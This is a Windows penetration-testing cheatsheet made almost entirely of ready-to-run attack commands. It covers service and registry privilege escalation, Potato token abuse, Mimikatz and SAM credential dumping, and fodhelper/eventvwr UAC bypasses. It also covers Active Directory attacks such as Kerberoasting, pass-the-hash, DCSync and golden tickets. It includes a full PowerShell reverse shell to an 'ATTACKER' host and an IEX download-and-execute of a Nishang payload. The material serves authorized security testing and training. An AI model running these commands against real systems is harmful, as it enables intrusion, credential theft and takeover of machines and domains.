# Windows Penetration Testing Cheatsheet

## Initial Enumeration

```cmd
:: System info
systeminfo
hostname
whoami /all
net user
net localgroup Administrators
ipconfig /all
route print
netstat -ano
tasklist /svc
wmic qfe list  (installed patches)
```

```powershell
# PowerShell equivalents
Get-ComputerInfo
Get-LocalUser
Get-LocalGroupMember Administrators
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}
Get-Process | Sort-Object CPU -Descending | Select-Object -First 20
Get-HotFix | Sort-Object InstalledOn -Descending
```

## Privilege Escalation — Automated

```powershell
# WinPEAS (most comprehensive)
.\winPEASx64.exe

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# SharpUp
.\SharpUp.exe audit

# Seatbelt (comprehensive system survey)
.\Seatbelt.exe -group=all
```

## Service Exploitation

```cmd
:: Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """

:: Weak service permissions
sc qc ServiceName
accesschk.exe /accepteula -uwcqv "Everyone" *
:: If modifiable: change binpath to reverse shell
sc config VulnSvc binpath= "C:\Users\Public\rev.exe"
sc stop VulnSvc && sc start VulnSvc

:: DLL hijacking
:: 1. Find service loading DLL from writable dir (Process Monitor)
:: 2. Place malicious DLL with expected name
:: 3. Restart service
```

## Registry Escalation

```cmd
:: AlwaysInstallElevated (MSI install as SYSTEM)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: If both = 1 → msfvenom -p windows/shell_reverse_tcp -f msi -o shell.msi
:: msiexec /quiet /qn /i shell.msi

:: AutoRun in writable paths
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

:: Saved credentials
cmdkey /list
runas /savecred /user:admin cmd.exe
```

## Token Manipulation

```powershell
whoami /priv

# SeImpersonatePrivilege (most common for service accounts)
# → Potato attacks
.\PrintSpoofer.exe -c "cmd.exe"           # Windows 10/Server 2019+
.\GodPotato.exe -cmd "cmd /c whoami"      # Universal
.\JuicyPotato.exe -l 1337 -p cmd.exe -t * # Older Windows
.\SweetPotato.exe -p cmd.exe              # Alternative

# SeBackupPrivilege → read any file
robocopy /b C:\Users\Administrator\Desktop C:\Temp flag.txt

# SeRestorePrivilege → write any file
# SeDebugPrivilege → inject into any process (including SYSTEM)
```

## Credential Harvesting

```powershell
# SAM/SYSTEM dump (admin required)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
# On attacker: secretsdump.py -sam SAM -system SYSTEM LOCAL

# Mimikatz
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords    # plaintext passwords
mimikatz# lsadump::sam                # SAM hashes
mimikatz# sekurlsa::tickets /export   # Kerberos tickets

# LaZagne (multi-app password recovery)
.\lazagne.exe all

# Windows Credential Manager
cmdkey /list
# Vault: C:\Users\USER\AppData\Local\Microsoft\Vault\

# Wi-Fi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# DPAPI (Data Protection API)
mimikatz# dpapi::cred /in:C:\Users\user\AppData\...\Credentials\GUID
```

## UAC Bypass

```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# fodhelper.exe (no UAC prompt)
reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe

# eventvwr.exe
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "cmd.exe" /f
eventvwr.exe

# UACME tool: https://github.com/hfiref0x/UACME
```

## Active Directory Enumeration

```powershell
# Domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
nltest /dclist:DOMAIN

# BloodHound (attack path visualization)
.\SharpHound.exe --CollectionMethods All
# Upload .zip to BloodHound GUI

# PowerView
Import-Module .\PowerView.ps1
Get-DomainUser | Select-Object samaccountname, description
Get-DomainGroup -AdminCount | Select-Object name
Get-DomainComputer | Select-Object name, operatingsystem
Find-LocalAdminAccess  # where current user is admin
Get-NetSession -ComputerName dc01  # active sessions
```

## Active Directory Attacks

```bash
# AS-REP Roasting (no pre-auth required)
GetNPUsers.py domain.com/ -usersfile users.txt -no-pass -dc-ip DC_IP
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# Kerberoasting (extract service ticket hashes)
GetUserSPNs.py domain.com/user:password -dc-ip DC_IP -request
hashcat -m 13100 tgs_hashes.txt wordlist.txt

# Pass-the-Hash
psexec.py -hashes :NTLM_HASH domain.com/admin@TARGET
wmiexec.py -hashes :NTLM_HASH domain.com/admin@TARGET
evil-winrm -i TARGET -u admin -H NTLM_HASH

# Pass-the-Ticket
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass domain.com/admin@TARGET

# DCSync (extract all domain hashes)
secretsdump.py domain.com/admin:password@DC_IP

# Golden Ticket
mimikatz# kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

## Lateral Movement

```bash
# PsExec
psexec.py domain.com/admin:password@TARGET
# Creates service, uploads executable, returns shell

# WMI
wmiexec.py domain.com/admin:password@TARGET

# WinRM
evil-winrm -i TARGET -u admin -p password

# SMB
smbexec.py domain.com/admin:password@TARGET

# RDP
xfreerdp /u:admin /p:password /v:TARGET /dynamic-resolution

# DCOM
dcomexec.py domain.com/admin:password@TARGET
```

## Reverse Shells (Windows)

```powershell
# PowerShell
$c = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b,0,$b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
    $r = (iex $d 2>&1 | Out-String);
    $r2 = $r + "PS " + (pwd).Path + "> ";
    $sb = ([text.encoding]::ASCII).GetBytes($r2);
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
}

# One-liner (base64 encode for delivery)
powershell -enc BASE64_OF_ABOVE

# Nishang
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER -Port PORT
```

## File Transfer (Windows)

```powershell
# PowerShell
Invoke-WebRequest -Uri http://ATTACKER/file -OutFile C:\Temp\file
(New-Object Net.WebClient).DownloadFile('http://ATTACKER/file','C:\Temp\file')
certutil -urlcache -split -f http://ATTACKER/file C:\Temp\file

# SMB share
copy \\ATTACKER\share\file C:\Temp\file
# On attacker: impacket-smbserver share /path/to/files

# Bitsadmin
bitsadmin /transfer job /download /priority high http://ATTACKER/file C:\Temp\file
```

## Common CVEs

```
# EternalBlue (MS17-010) — SMB RCE (Windows 7/Server 2008 R2)
nmap --script smb-vuln-ms17-010 TARGET

# ZeroLogon (CVE-2020-1472) — Netlogon → domain admin
# PrintNightmare (CVE-2021-34527) — Print Spooler RCE
# HiveNightmare (CVE-2021-36934) — Read SAM as non-admin
# noPac (CVE-2021-42278/42287) — Domain user → domain admin
# PetitPotam — NTLM relay via EFS
```

## Useful One-Liners

```cmd
:: Find files with passwords
findstr /si "password" *.txt *.xml *.ini *.cfg *.config
dir /s /b *pass* *cred* *vnc* *.config 2>nul

:: Find writable directories
icacls "C:\Program Files\*" /T /C 2>nul | findstr /i "Everyone Users BUILTIN"

:: Installed software
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr DisplayName

:: Network shares
net share
net view \\TARGET
```
